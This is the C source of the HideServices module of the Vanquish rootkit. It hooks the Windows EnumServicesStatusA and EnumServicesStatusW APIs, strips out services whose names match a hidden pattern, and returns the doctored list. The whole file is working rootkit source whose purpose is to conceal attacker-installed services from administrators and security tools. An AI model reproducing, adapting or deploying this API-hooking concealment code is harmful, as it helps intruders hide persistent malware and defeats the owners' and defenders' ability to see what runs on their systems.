/******************************************************************************\

	Vanquish DLL HideServices - Copyright (c)2003-2005 XShadow, All rights reserved.

	This program is free software; you can redistribute it but not modify
	it under the terms of license.txt file that came with this package

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
	license for more details.

\******************************************************************************/

#include "vHideServices.h"
#include "..\Utils.h"

DECLARE_HIDESERVICES

const DWORD SERVICE_MIN_MEM = 1024;

/* ADD CRITICAL SECTION??? */

NEWAPI
BOOL
WINAPI
VEnumServicesStatusA(
    SC_HANDLE hSCManager,
    DWORD dwServiceType,
    DWORD dwServiceState,
    LPENUM_SERVICE_STATUSA lpServices,
    DWORD cbBufSize,
    LPDWORD pcbBytesNeeded,
    LPDWORD lpServicesReturned,
    LPDWORD lpResumeHandle
    )
{
	BOOL retValue = FALSE;
	DWORD i, j, dwCount, cbBufSizeOLD = cbBufSize, dwBase, dwSize, dwOldSize;
	LPDWORD pcbBytesNeededOLD = pcbBytesNeeded;
	LPDWORD lpServicesReturnedOLD = lpServicesReturned;
	LPDWORD lpResumeHandleOLD = lpResumeHandle;
	LPENUM_SERVICE_STATUSA lpServicesOLD = lpServices;
	LPVOID lpString = NULL;

	//check pointers; better safe than sorry.
	SetLastError(ERROR_INVALID_PARAMETER);
	if (IsBadWritePtr(lpServicesReturned, sizeof(DWORD))) return FALSE;
	*lpServicesReturned = 0;
	if (IsBadWritePtr(lpServices, cbBufSize)) return FALSE;
	if (IsBadWritePtr(pcbBytesNeeded, sizeof(DWORD))) return FALSE;
	if (IsBadReadPtr(lpResumeHandle, sizeof(DWORD))) return FALSE;
	if (IsBadWritePtr(lpResumeHandle, sizeof(DWORD))) return FALSE;

	//make sure API does our bidding...
	lpServices = NULL;
	cbBufSize = SERVICE_MIN_MEM;
	pcbBytesNeeded = &dwSize;
	lpServicesReturned = &dwCount;
	lpResumeHandle = &dwBase;

	//alloc space
	lpServices = (LPENUM_SERVICE_STATUSA)VRTAlloc(cbBufSize);
	if (!lpServices)
	{
		//panic!
		VRTWriteLog(TRUE, GetLastError(), NULL, "Error allocating %u bytes in EnumServiceStatusA.\r\n", cbBufSize);
		ExitProcess(0);
	}

	//the base
	dwBase = 0;

	//do the api thing
	RESTORE_API(EnumServicesStatusA);
	OLDCALL(EnumServicesStatusA, 8);
	REPLACE_API(EnumServicesStatusA);

	if (!retValue)
	{
		if (GetLastError() == ERROR_MORE_DATA)
		{
			//base is zero
			dwBase = 0;

			//make sure we won't fail this time
			cbBufSize += dwSize;

			//we hungry; we need more memory; aargh!
			lpServices = (LPENUM_SERVICE_STATUSA)VRTReAlloc(lpServices, cbBufSize);
			if (!lpServices)
			{
				//panic!
				VRTWriteLog(TRUE, GetLastError(), NULL, "Error allocating %u bytes in EnumServiceStatusA.\r\n", cbBufSize);
				ExitProcess(0);
			}

			//retry call
			RESTORE_API(EnumServicesStatusA);
			OLDCALL(EnumServicesStatusA, 8);
			REPLACE_API(EnumServicesStatusA);

			if (!retValue)
			{
				//panic
				VRTWriteLog(TRUE, GetLastError(), NULL, "Not able to EnumServicesA properly (need additional %u bytes).\r\n", *pcbBytesNeeded);
				ExitProcess(0);
			}
		}
		else goto cleanup; //it's not our fault (e.g. invalid SC handle)
	}

	//we use the RKI algorithm but with no caching; we don't need speed anyways and it's simpler...
	//1.destroy suspect entries && strings
	for (i = 0; i < dwCount; i++)
	{
		if (pos0(lpServices[i].lpServiceName) != MAXDWORD)
		{
			lpServices[i].lpServiceName = NULL;
			lpServices[i].lpDisplayName = NULL;
		}
	}

	//2.do indexing
	j = 0;
	for (i = 0; (i < dwCount) && (j < dwCount); i++)
	{
		while (lpServices[j].lpServiceName == NULL)
		{
			j++;
			if (j >= dwCount) break;
		}
		if (j >= dwCount) break;

		if (i < j)
			lpServices[i] = lpServices[j];
			//VRTCopyMemory(&(lpServices[i]), &(lpServices[j]), sizeof(ENUM_SERVICE_STATUSA));
		j++;
	}

	//now: i - number of total entries
    //     lpServices - has all entries there

	//rebase first
	dwBase = *lpResumeHandleOLD / sizeof(ENUM_SERVICE_STATUSA);

	//find out how much data we can copy; and copy services; strings later
	dwOldSize = 0;
	dwSize = 0;
	dwCount = 0;
	for (j = dwBase; j < i; j++)
	{
		dwSize += sizeof(ENUM_SERVICE_STATUSA); //with string nulls
		dwSize += STRB_SIZEA(STR_NUMCHA(lpServices[j].lpServiceName));
		dwSize += STRB_SIZEA(STR_NUMCHA(lpServices[j].lpDisplayName));
		if (dwSize > cbBufSizeOLD) continue; //parse it all
		dwCount++;
		dwOldSize = dwSize;
		lpServicesOLD[j - dwBase] = lpServices[j];
		//VRTCopyMemory(&(lpServicesOLD[j - dwBase]), &(lpServices[j]), sizeof(ENUM_SERVICE_STATUSA));
	}

	//update memory information
	*lpServicesReturnedOLD = dwCount;
	if (dwSize > cbBufSizeOLD)
	{
		*pcbBytesNeededOLD = dwSize - cbBufSizeOLD;
		*lpResumeHandleOLD = (dwBase + dwCount) * sizeof(ENUM_SERVICE_STATUSA);
		SetLastError(ERROR_MORE_DATA);
		retValue = FALSE;
	}
	else
	{
		*lpResumeHandleOLD = 0;
		retValue = TRUE;
	}

	//real size that we are gonna use
	dwSize = dwOldSize;

	//where to start copying strings; copy strings
	lpString = &(lpServicesOLD[dwCount]);
	for (j = dwBase; j < dwCount; j++)
	{
		//copy with null
		dwOldSize = STRB_SIZEA(STR_NUMCHA(lpServices[j].lpServiceName));
		VRTCopyMemory(lpString, lpServices[j].lpServiceName, dwOldSize);

		//update buffer with real address
		lpServicesOLD[j - dwBase].lpServiceName = (LPSTR)lpString;

		//advance
		lpString = (LPVOID)((DWORD)lpString + dwOldSize);

		/////////////////////////////////////////////////

		//copy with null
		dwOldSize = STRB_SIZEA(STR_NUMCHA(lpServices[j].lpDisplayName));
		VRTCopyMemory(lpString, lpServices[j].lpDisplayName, dwOldSize);

		//update buffer with real address
		lpServicesOLD[j - dwBase].lpDisplayName = (LPSTR)lpString;

		//advance
		lpString = (LPVOID)((DWORD)lpString + dwOldSize);
	}

cleanup:
	if (lpServices) VRTFree(lpServices);
	return retValue;
}

NEWAPI
BOOL
WINAPI
VEnumServicesStatusW(
    SC_HANDLE hSCManager,
    DWORD dwServiceType,
    DWORD dwServiceState,
    LPENUM_SERVICE_STATUSW lpServices,
    DWORD cbBufSize,
    LPDWORD pcbBytesNeeded,
    LPDWORD lpServicesReturned,
    LPDWORD lpResumeHandle
    )
{
	BOOL retValue = FALSE;
	DWORD i, j, dwCount, cbBufSizeOLD = cbBufSize, dwBase, dwSize, dwOldSize;
	LPDWORD pcbBytesNeededOLD = pcbBytesNeeded;
	LPDWORD lpServicesReturnedOLD = lpServicesReturned;
	LPDWORD lpResumeHandleOLD = lpResumeHandle;
	LPENUM_SERVICE_STATUSW lpServicesOLD = lpServices;
	LPVOID lpString = NULL;

	//check pointers; better safe than sorry.
	SetLastError(ERROR_INVALID_PARAMETER);
	if (IsBadWritePtr(lpServicesReturned, sizeof(DWORD))) return FALSE;
	*lpServicesReturned = 0;
	if (IsBadWritePtr(lpServices, cbBufSize)) return FALSE;
	if (IsBadWritePtr(pcbBytesNeeded, sizeof(DWORD))) return FALSE;
	if (IsBadReadPtr(lpResumeHandle, sizeof(DWORD))) return FALSE;
	if (IsBadWritePtr(lpResumeHandle, sizeof(DWORD))) return FALSE;

	//make sure API does our bidding...
	lpServices = NULL;
	cbBufSize = SERVICE_MIN_MEM;
	pcbBytesNeeded = &dwSize;
	lpServicesReturned = &dwCount;
	lpResumeHandle = &dwBase;

	//alloc space
	lpServices = (LPENUM_SERVICE_STATUSW)VRTAlloc(cbBufSize);
	if (!lpServices)
	{
		//panic!
		VRTWriteLog(TRUE, GetLastError(), NULL, "Error allocating %u bytes in EnumServiceStatusW.\r\n", cbBufSize);
		ExitProcess(0);
	}

	//the base
	dwBase = 0;

	//do the api thing
	RESTORE_API(EnumServicesStatusW);
	OLDCALL(EnumServicesStatusW, 8);
	REPLACE_API(EnumServicesStatusW);

	if (!retValue)
	{
		if (GetLastError() == ERROR_MORE_DATA)
		{
			//base is zero
			dwBase = 0;

			//make sure we won't fail this time
			cbBufSize += dwSize;

			//we hungry; we need memory; aargh!
			lpServices = (LPENUM_SERVICE_STATUSW)VRTReAlloc(lpServices, cbBufSize);
			if (!lpServices)
			{
				//panic!
				VRTWriteLog(TRUE, GetLastError(), NULL, "Error allocating %u bytes in EnumServiceStatusW.\r\n", cbBufSize);
				ExitProcess(0);
			}

			//retry call
			RESTORE_API(EnumServicesStatusW);
			OLDCALL(EnumServicesStatusW, 8);
			REPLACE_API(EnumServicesStatusW);

			if (!retValue)
			{
				//panic
				VRTWriteLog(TRUE, GetLastError(), NULL, "Not able to EnumServicesW properly (need additional %u bytes).\r\n", *pcbBytesNeeded);
				ExitProcess(0);
			}
		}
		else goto cleanup; //it's not our fault (e.g. invalid SC handle)
	}

	//we use the RKI algorithm but with no caching; we don't need speed anyways and it's simpler...
	//1.destroy suspect entries && strings
	for (i = 0; i < dwCount; i++)
	{
		if (posw0(lpServices[i].lpServiceName) != MAXDWORD)
		{
			lpServices[i].lpServiceName = NULL;
			lpServices[i].lpDisplayName = NULL;
		}
	}

	//2.do indexing
	j = 0;
	for (i = 0; (i < dwCount) && (j < dwCount); i++)
	{
		while (lpServices[j].lpServiceName == NULL)
		{
			j++;
			if (j >= dwCount) break;
		}
		if (j >= dwCount) break;

		if (i < j)
			lpServices[i] = lpServices[j];
			//VRTCopyMemory(&(lpServices[i]), &(lpServices[j]), sizeof(ENUM_SERVICE_STATUSW));
		j++;
	}

	//now: i - number of total entries
    //     lpServices - has all entries there

	//rebase first
	dwBase = *lpResumeHandleOLD / sizeof(ENUM_SERVICE_STATUSW);

	//find out how much data we can copy; and copy services; strings later
	dwOldSize = 0;
	dwSize = 0;
	dwCount = 0;
	for (j = dwBase; j < i; j++)
	{
		dwOldSize = dwSize;
		dwSize += sizeof(ENUM_SERVICE_STATUSW);
		dwSize += STRB_SIZEW(STR_NUMCHW(lpServices[j].lpServiceName));
		dwSize += STRB_SIZEW(STR_NUMCHW(lpServices[j].lpDisplayName));
		if (dwSize > cbBufSizeOLD) continue; //parse it all
		dwCount++;
		lpServicesOLD[j - dwBase] = lpServices[j];
		//VRTCopyMemory(&(lpServicesOLD[j - dwBase]), &(lpServices[j]), sizeof(ENUM_SERVICE_STATUSW));
	}

	//update memory information
	*lpServicesReturnedOLD = dwCount;
	if (dwSize > cbBufSizeOLD)
	{
		*pcbBytesNeededOLD = dwSize - cbBufSizeOLD;
		*lpResumeHandleOLD = (dwBase + dwCount) * sizeof(ENUM_SERVICE_STATUSW);
		SetLastError(ERROR_MORE_DATA);
		retValue = FALSE;
	}
	else
	{
		*lpResumeHandleOLD = 0;
		retValue = TRUE;
	}

	//real size
	dwSize = dwOldSize;

	//where to star copying strings; copy strings
	lpString = &(lpServicesOLD[dwCount]);
	for (j = dwBase; j < dwCount; j++)
	{
		//copy with null
		dwOldSize = STRB_SIZEW(STR_NUMCHW(lpServices[j].lpServiceName));
		VRTCopyMemory(lpString, lpServices[j].lpServiceName, dwOldSize);

		//update buffer with real address
		lpServicesOLD[j - dwBase].lpServiceName = (LPWSTR)lpString;

		//advance
		lpString = (LPVOID)((DWORD)lpString + dwOldSize);

		/////////////////////////////////////////////////

		//copy with null
		dwOldSize = STRB_SIZEW(STR_NUMCHW(lpServices[j].lpDisplayName));
		VRTCopyMemory(lpString, lpServices[j].lpDisplayName, dwOldSize);

		//update buffer with real address
		lpServicesOLD[j - dwBase].lpDisplayName = (LPWSTR)lpString;

		//advance
		lpString = (LPVOID)((DWORD)lpString + dwOldSize);
	}

cleanup:
	if (lpServices) VRTFree(lpServices);
	return retValue;
}
